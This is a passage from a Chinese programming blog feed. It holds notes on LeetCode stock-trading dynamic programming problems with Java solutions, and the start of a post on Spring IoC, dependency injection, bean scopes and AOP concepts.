&#125;</span><br></pre></td></tr></table></figure><p>我们声明：</p><p>定义sell表示截止到当天，卖之后能得到的最大收益</p><p>定义buy表示截止到当天，买之后能得到的最大收益</p><p>我们可以画出状态机：（画的有点差）</p><p><img src="clip_image002-1585294076856.png" alt></p><p>就是说它有两个状态，一个是BUY，一个是SELL。</p><p>买入必须在卖出之前，且卖出必须依赖于上一个买入的值。</p><p><strong>BUY可以保存BUY的状态或者通过买入进入SELL状态。</strong></p><p><strong>SELL可以保存SELL的状态或者通过卖出退出状态。</strong></p><p>卖完后就结束了。</p><p>因此我们可以写出递推式：</p><p>Buy = max(Buy,0-price[i]);</p><p>Sell=max(Sell,Buy+price[i]);</p><p>然后我们遍历一遍pirce数组，由于我们在一个循环里面同时做buy和sell。因此不会发生sell在buy之前。</p><p>又由于sell依赖于上次buy的值，而不是buy更新后的值。所以我们在进入循环前先初始化buy为-price[0]; sell为0（因为收益最少为0），在循环中先sell然后再buy。Sell处理初始化buy的值，然后buy更新buy的值。</p><p>如果要先执行buy再执行sell也可以。前提是得用一个变量先保存当前buy的值。</p><table><thead><tr><th></th><th><strong>1</strong></th><th><strong>2</strong></th><th><strong>3</strong></th><th><strong>4</strong></th><th><strong>5</strong></th></tr></thead><tbody><tr><td><strong>Sell</strong></td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>Buy</strong></td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td></tr><tr><td><strong>Statue</strong></td><td>buy</td><td></td><td></td><td></td><td>sell</td></tr></tbody></table> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">stateMachine</span><span class="params">(<span class="keyword">int</span>[] prices)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">     sell=Math.*max*(sell, buy+prices[i]);</span><br><span class="line">     buy=Math.*max*(buy, <span class="number">0</span>-prices[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> sell;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>或者用tmp保存上次buy的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">stateMachine1</span><span class="params">(<span class="keyword">int</span>[] prices)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">     <span class="keyword">int</span> tmp = buy;</span><br><span class="line">     buy=Math.*max*(buy, -prices[i]);</span><br><span class="line">     sell=Math.*max*(sell, tmp+prices[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> sell;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当然其实不用tmp保存也是可以的，就相当于初始化为price[0]或者price[1]的最小值，也就是-price[0]或者-price[1]的最大值。</p><h2><span id="leetcode-122-best-time-to-buy-and-sell-stock-ii">Leetcode 122 Best Time to Buy and Sell Stock II √</span></h2><p>给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>无数次交易</strong>，求最大收益。</p><p>输入：[7, 1, 5, 3, 6, 4]</p><p>输出：7</p><p>输入：[1, 2, 3, 4, 5]</p><p>输出：4</p><p>正常解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit1</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, buy, sell, profit = <span class="number">0</span>, N = prices.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; N) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; N &amp;&amp; prices[i + <span class="number">1</span>] &lt;= prices[i]) i++;</span><br><span class="line">        buy = prices[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; N &amp;&amp; prices[i + <span class="number">1</span>] &gt; prices[i]) i++;</span><br><span class="line">        sell = prices[i];</span><br><span class="line"></span><br><span class="line">        profit += sell - buy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> profit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步：下定义</p><p>定义sell表示截止到当天，卖之后能得到的最大收益</p><p>定义buy表示截止到当天，买之后能得到的最大收益</p><p>第二步：画状态机</p><p> <img src="image-20200327154233734.png" alt></p><p>第三步：写递推式</p><p>BUY = max(BUY,SELL-PRICE[I]);</p><p>SELL = max(SELL,BUY+PRICE[I]);</p><table><thead><tr><th></th><th><strong>7</strong></th><th><strong>1</strong></th><th><strong>5</strong></th><th><strong>3</strong></th><th><strong>6</strong></th><th><strong>4</strong></th></tr></thead><tbody><tr><td><strong>Sell</strong></td><td>0</td><td>0</td><td>4</td><td>4</td><td>7</td><td>7</td></tr><tr><td><strong>buy</strong></td><td>-7</td><td>-1</td><td>-1</td><td>1</td><td>1</td><td>3</td></tr><tr><td><strong>statue</strong></td><td></td><td>Buy</td><td>Sell</td><td>Buy</td><td>Sell</td><td>buy</td></tr></tbody></table><p>我们可以看到：</p><ol><li><p>因为都是取最大值max，所以buy和sell都是上升的</p></li><li><p>Buy依赖于上一个sell，sell依赖于上一个buy</p></li></ol><p>第四步：写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> buy = -prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">           <span class="keyword">int</span> tmp = sell;</span><br><span class="line">           sell=Math.max(sell,prices[i]+buy);</span><br><span class="line">           buy=Math.max(buy,tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先卖再买还是因为我们已经初始化了buy了，默认让它选择第一个元素，因此可以选择卖或者不变。</p><h2><span id="leetcode-123-best-time-to-buy-and-sell-stock-iii">Leetcode 123 Best Time to Buy and Sell Stock III √</span></h2><p>给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>最多两次交易</strong>，求最大收益。 </p><p>输入：[3,3,5,0,0,3,1,4]</p><p>输出：6 </p><p>输入：[1, 2, 3, 4, 5]</p><p>输出：4 </p><p>OK</p><p>还是四步走！</p><p>自己试试看，其实画出状态图就行了。</p><p>Step1:</p><p>定义sell0表示截止到当天，第一次卖之后能得到的最大收益</p><p>定义buy0表示截止到当天，第一次买之后能得到的最大收益</p><p>定义sell1表示截止到当天，第二次卖之后能得到的最大收益</p><p>定义buy1表示截止到当天，第二次买之后能得到的最大收益</p><p>Step2:</p><p> <img src="image-20200327154943779.png" alt></p><p>Step3:</p><p>注意如何初始化！！</p><p>BUY2定义为多少？</p><p>首先BUY2的值必须等于sell1-price[i]吧，所以buy2就必须初始化为最小值</p><p>Integer.<em>MIN_VALUE</em></p><p>那Sell2呢？也是0</p><p>因此：</p><p>SELL1=MAX(SELL1,BUY1+PRICE[I]);</p><p>BUY1=MAX(BUY1, 0-PRICE[I]);</p><p>SELL2=MAX(SELL2,BUY2+PRICE[I]);</p><p>BUY2=MAX(BUY2,SELL1-PRICE[I]);</p><p>这里有什么问题吗？</p><p>尽管我们在这里利用颠倒buy和sell的顺序来做（为什么颠倒可以避免更新？因为我们初始化了buy和sell，如果不初始化buy1的话我们要正序，但是正序就需要更多的tmp来保存状态了，不知道能不能理解）。BUY2依赖于上个SELL1的值，但是在BUY2更新之前SELL1就已经更新了，因此需要保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> buy1= -prices[<span class="number">0</span>],sell1=<span class="number">0</span>,buy2=Integer.MIN_VALUE,sell2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = sell1;</span><br><span class="line">        sell1 = Math.max(sell1, buy1+prices[i]);</span><br><span class="line">        buy1 = Math.max(buy1, <span class="number">0</span>-prices[i]);</span><br><span class="line"></span><br><span class="line">        sell2 = Math.max(sell2, buy2+prices[i]);</span><br><span class="line">        buy2 =  Math.max(buy2, tmp-prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Math.max(sell2,sell1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是实际上我们还可以颠倒sell1和sell2的顺序,而不需要tmp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> buy1= -prices[<span class="number">0</span>],sell1=<span class="number">0</span>,buy2=Integer.MIN_VALUE,sell2=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;            </span><br><span class="line">           sell2 = Math.max(sell2, buy2+prices[i]);</span><br><span class="line">           buy2 =  Math.max(buy2, sell1-prices[i]);</span><br><span class="line">           </span><br><span class="line">           sell1 = Math.max(sell1, buy1+prices[i]);</span><br><span class="line">           buy1 = Math.max(buy1, -prices[i]);           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Math.max(sell2,sell1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-188-best-time-to-buy-and-sell-stock-iv">Leetcode 188 Best Time to Buy and Sell Stock IV ×</span></h2><p>给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>最多</strong>K次交易，求最大收益。</p><p>输入：[2, 4, 1], k = 2</p><p>输出：2</p><p>输入：[3,2,6,5,0,3], k = 2</p><p>输出：7</p><p>刚刚两次交易我们需要buy1 buy2 sell1 sell2，所以K次交易需要多少个sell buy呢？K个吗？</p><p>不一定对。</p><p>当K&gt;=给定数组长度/2 即：price.length/2的时候，我们可以理解为买卖无数次的结果，因此相对于第二题。为什么要想那么麻烦呢？因为第二题是O(n)的解法。</p><p>初始化buy可以都填充-prices[0]的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>||k==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (prices.length/<span class="number">2</span>&lt;=k) <span class="keyword">return</span> maxProfit(prices);</span><br><span class="line">    <span class="keyword">int</span>[] buy = <span class="keyword">new</span> <span class="keyword">int</span>[k+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span>[] sell= <span class="keyword">new</span> <span class="keyword">int</span>[k+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    Arrays.fill(buy, Integer.MIN_VALUE);</span><br><span class="line">    buy[<span class="number">1</span>] = -prices[<span class="number">0</span>];   </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= k; j++) &#123;</span><br><span class="line">            buy[j] = Math.max(buy[j],sell[j-<span class="number">1</span>]-prices[i]);</span><br><span class="line">            sell[j] = Math.max(sell[j],buy[j]+prices[i]);            </span><br><span class="line">            res=Math.max(res,sell[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> buy = -prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = sell;</span><br><span class="line">        sell = Math.max(sell, buy+prices[i]);</span><br><span class="line">        buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-309-best-time-to-buy-and-sell-stock-with-cooldown">Leetcode 309 Best Time to Buy and Sell Stock with Cooldown √</span></h2><p>给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>无数次交易，但每次卖出之后必须至少休息一天</strong>，求最大收益。</p><p>输入：[1,2,3,0,2]</p><p>输出：3</p><p>自己做吧</p><p>定义sell表示截止到当天，卖之后能得到的最大收益</p><p>定义buy表示截止到当天，买之后能得到的最大收益</p><p>定义rest表示截止到当天，休息之后能得到的最大收益</p><p>Rest的初始值？？</p><p>按顺序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> buy = -prices[<span class="number">0</span>],sell=<span class="number">0</span>,rest=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = rest;</span><br><span class="line">            rest = Math.max(rest, sell);</span><br><span class="line">            sell = Math.max(sell,buy+prices[i]);</span><br><span class="line">            buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-714-best-time-to-buy-and-sell-stock-with-transcation-fee">Leetcode 714 Best Time to Buy and Sell Stock with Transcation Fee √</span></h2><p>给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>无数次交易，但每次卖出需要支付一定的手续费</strong>，求最大收益。</p><p>输入：[1, 3, 2, 8, 4, 9], fee = 2</p><p>输出：8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices, <span class="keyword">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;  </span><br><span class="line">            <span class="keyword">int</span> tmp = sell;</span><br><span class="line">            sell = Math.max(sell, buy+prices[i]-fee);</span><br><span class="line">            buy = Math.max(buy, tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-concept</title>
      <link href="/2020/03/23/spring-concept/"/>
      <url>/2020/03/23/spring-concept/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Spinrg基础知识点 </p><a id="more"></a><!-- toc --><ul><li><a href="#iocinversion-of-control控制反转">IOC（Inversion of Control）：控制反转</a></li><li><a href="#依赖注入">依赖注入</a></li><li><a href="#依赖注入的方式">依赖注入的方式</a></li><li><a href="#依赖倒置原则ioc-di-ioc容器的关系">依赖倒置原则，IOC、DI、IOC容器的关系</a></li><li><a href="#ioc容器的优势">IOC容器的优势</a></li><li><a href="#spring-ioc支持的功能">Spring IOC支持的功能</a></li><li><a href="#spring-ioc容器的核心接口">Spring IOC容器的核心接口</a></li><li><a href="#beanfactoryspring框架最核心的接口">BeanFactory：Spring框架最核心的接口</a></li><li><a href="#beanfactory与applicationcontext的比较">BeanFactory与ApplicationContext的比较</a></li><li><a href="#三个常用的applicationcontext实现是">三个常用的ApplicationContext实现是:</a></li><li><a href="#getbean方法的代码逻辑">GetBean方法的代码逻辑</a></li><li><a href="#spring-bean的作用域">Spring Bean的作用域</a></li><li><a href="#关注点分离不同的问题交给不同的部分去解决">关注点分离：不同的问题交给不同的部分去解决</a></li><li><a href="#aop的三种织入方式">AOP的三种织入方式</a></li><li><a href="#aop的主要名词概念">AOP的主要名词概念</a></li><li><a href="#advice的种类">Advice的种类</a></li><li><a href="#aop的实现jdkproxy和cglib">AOP的实现：jdkProxy和Cglib</a></li><li><a href="#spring里代理模式的实现">Spring里代理模式的实现</a></li><li><a href="#事务传播">事务传播</a></li><li><a href="#什么是aop">什么是AOP</a></li></ul><!-- tocstop --><h2><span id="iocinversion-of-control控制反转">IOC（Inversion of Control）：控制反转</span></h2><p>有了IoC容器后，把创建和查找依赖对象的控制权交给了容器，由容器进行注入组合对象，所以对象与对象之间是松散耦合，这样也方便测试，利于功能复用，更使得程序的整个体系结构变得非常灵活。</p><p>Ø Spring Core最核心的部分</p><p>Ø 需要了解依赖注入（Dependency Injection）</p><p><img src="image-20200406162508205.png" alt></p><p><img src="image-20200406162518521.png" alt></p><p>如果想把tire的size动态化改变就会牵一发而动全身，上层的代码也得修改</p><p><img src="image-20200406162547753.png" alt></p><h2><span id="依赖注入">依赖注入</span></h2><p>含义：把低层类作为参数传递给上层类，实现上层对下层的“控制”</p><p><img src="image-20200406162607619.png" alt></p><p>将tire作为构造函数的参数传入，并赋值给上层的成员变量。</p><p><img src="image-20200406162616526.png" alt></p><p>想要修改就可以只修改Tire的代码</p><p><img src="image-20200406162626533.png" alt></p><p><img src="image-20200406162635151.png" alt></p><p>DL是更主动的方法，会在需要的时候通过调用框架的方法来获取对象，获取时需要提供相关的文件路径，key等信息，来确定获取对象的状态。</p><p>DL已经被抛弃，因为它需要用户自己去使用API进行查找资源和组装对象，即有侵入性。</p><h2><span id="依赖注入的方式">依赖注入的方式</span></h2><p>Ø Setter</p><p>Ø Interface</p><p>Ø Constructor</p><p>Ø Annotation</p><h2><span id="依赖倒置原则ioc-di-ioc容器的关系">依赖倒置原则，IOC、DI、IOC容器的关系</span></h2><p><img src="image-20200406162723575.png" alt></p><h2><span id="ioc容器的优势">IOC容器的优势</span></h2><p>Ø 避免在各处使用new来创建类，并且可以做到统一维护</p><p>Ø 创建实例的时候不需要了解其中的细节 </p><p>在刚刚的例子中，我们是从低层往上层去new的，我们需要了解整个流程（从tire到luggage）的构造函数是怎么定义的才能一步步组装。 </p><p>而依赖注入则是从最上层开始查找依赖关系，然后再往上一步一步去new。有点像DFS</p><p><img src="image-20200406163228391.png" alt></p><p>蓝色部分是隐藏的细节</p><p><img src="image-20200406163238732.png" alt></p><p><img src="image-20200406163245378.png" alt></p><h2><span id="spring-ioc支持的功能">Spring IOC支持的功能</span></h2><p>Ø 依赖注入</p><p>Ø 依赖检查</p><p>Ø 自动装配</p><p>Ø 支持集合</p><p>Ø 指定初始化方法和销毁方法</p><p>Ø 支持回调方法</p><h2><span id="spring-ioc容器的核心接口">Spring IOC容器的核心接口</span></h2><p>Ø BeanFactory</p><p>Ø ApplicationContext</p><p><img src="image-20200406163330970.png" alt></p><p>Spring容器启动的时候会将注解或者XML里面Bean的定义解析成Spring内部的BeanDefinition</p><p><img src="image-20200406163354759.png" alt></p><p><img src="image-20200406163358035.png" alt></p><p>是个ConcurrentHashMap</p><h2><span id="beanfactoryspring框架最核心的接口">BeanFactory：Spring框架最核心的接口</span></h2><p>Ø 提供IOC的配置机制</p><p>Ø 包含Bean的各种定义，便于实例化Bean</p><p>Ø 建立Bean之间的依赖关系</p><p>Ø Bean生命周期的控制</p><p> <img src="image-20200406163455731.png" alt></p><p>ApplicationContext是BeanFactory的子接口之一</p><h2><span id="beanfactory与applicationcontext的比较">BeanFactory与ApplicationContext的比较</span></h2><p>Ø BeanFactory是Spring框架的基础设施，面向Spring</p><p>Ø ApplicationContext面向使用Spring框架的开发者</p><p>ApplicationContext的功能（实现多个接口）</p><p>Ø BeanFactory：能够管理、装配Bean</p><p>Ø ResourcePatternResolver：能够加载资源文件</p><p>Ø MessageSource：能够实现国际化等功能</p><p>Ø ApplicationEventPublisher：能够注册监听器，实现监听机制</p><p><img src="image-20200406163605604.png" alt></p><h2><span id="三个常用的applicationcontext实现是">三个常用的ApplicationContext实现是:</span></h2><ol><li>ClassPathXmlApplicationContext:它从classpath路径下的一个XML文件加载context的,将Context作为classpath下的资源。加载应用程序classpath下的context使用的代码如下：</li></ol><p>ApplicationContext context = new ClassPathXmlApplicationContext(“bean.xml”);</p><ol start="2"><li>FileSystemXmlApplicationContext:它从文件系统的一个XML文件加载上下文定义的。从文件系统加载应用程序上下文通过如下代码实现。</li></ol><p>ApplicationContext context = new FileSystemXmlApplicationContext(“bean.xml”);</p><ol start="3"><li>XmlWebApplicationContext:它从一个web应用程序中包含的XML文件加载context。</li></ol><h2><span id="getbean方法的代码逻辑">GetBean方法的代码逻辑</span></h2><p>Ø 转换beanName</p><p>Ø 从缓存中加载实例</p><p>Ø 实例化Bean</p><p>Ø 检测patternBeanFactory</p><p>Ø 初始化依赖的Bean</p><p>Ø 创建Bean</p><h2><span id="spring-bean的作用域">Spring Bean的作用域</span></h2><p>Ø Singleton：Spring的默认作用域，容器里拥有唯一的Bean实例</p><p>Ø Prototype：针对每个getBean请求，容器都会创建一个Bean实例</p><p>Ø Request：会对每个HTTP请求创建一个Bean实例</p><p>Ø Session：会对每个Session创建一个Bean实例</p><p>Ø globalSession：会为每个全局Http Session创建一个Bean实例，该作用域仅对Portlet有效</p><p><img src="image-20200406163629950.png" alt></p><p><img src="image-20200406163635201.png" alt></p><p><img src="https://www.javazhiyin.com/wp-content/uploads/2019/05/java0-1558500658.jpg" alt="深究Spring中Bean的生命周期"></p><h2><span id="关注点分离不同的问题交给不同的部分去解决">关注点分离：不同的问题交给不同的部分去解决</span></h2><p>Ø 面向切面编程AOP正是此种技术的体现</p><p>Ø 通用化功能代码的实现，对应的就是所谓的切面（Aspect）</p><p>Ø 业务功能代码和切面代码分开后，架构将变得高内聚低耦合</p><p>Ø 确保功能的完整性：切面最终需要被合并到业务中（Weave）</p><h2><span id="aop的三种织入方式">AOP的三种织入方式</span></h2><p>Ø 编译时织入：需要特殊的Java编译器，如AspectJ</p><p>Ø 类加载时织入：需要特殊的Java编译器，如AspectJ和AspectWerkz</p><p>Ø 运行时织入：Spring采用的方式，通过动态代理的方式，实现简单</p><h2><span id="aop的主要名词概念">AOP的主要名词概念</span></h2><p>Ø Aspect：通用功能的代码实现</p><p>Ø Target:被织入Aspect的对象</p><p>Ø Join Point：可以作为切入点的机会，所有方法都可以作为切入点</p><p>Ø Pointcut：Aspect实际被应用在的Join Point，支持正则</p><p>Ø Advice：类里的方法以及这个方法如何织入到目标方法的方式</p><p>Ø Weaving：AOP的实现过程</p><h2><span id="advice的种类">Advice的种类</span></h2><p>Ø 前置通知（Before）</p><p>Ø 后置通知（AfterReturning）</p><p>Ø 异常通知（AfterThrowing）</p><p>Ø 最终通知（After）</p><p>Ø 环绕通知（Around）</p><h2><span id="aop的实现jdkproxy和cglib">AOP的实现：jdkProxy和Cglib</span></h2><p>Ø 由AopProxyFactory根据AdvisedSupport对象的配置来决定</p><p>Ø 默认策略如果目标类是接口，则用JDKProxy来实现，否则用后者</p><p>Ø JDKProxy的核心：InvocationHandler接口和Proxy类</p><p>Ø Cglib：以继承的方式动态生成目标类的代理</p><p>Ø JDKProxy：通过Java的内部反射机制实现</p><p>Ø Cglib：借助ASM实现</p><p>Ø 反射机制在生成类的过程中比较高效</p><p>Ø ASM在生成类之后的执行过程中比较高效</p><p><strong><font color="orange">代理模式：接口+真实实现类+代理类</font></strong></p><p> <img src="image-20200406163709120.png" alt></p><p><img src="image-20200406163712301.png" alt></p><p><img src="image-20200406163716479.png" alt></p><p><img 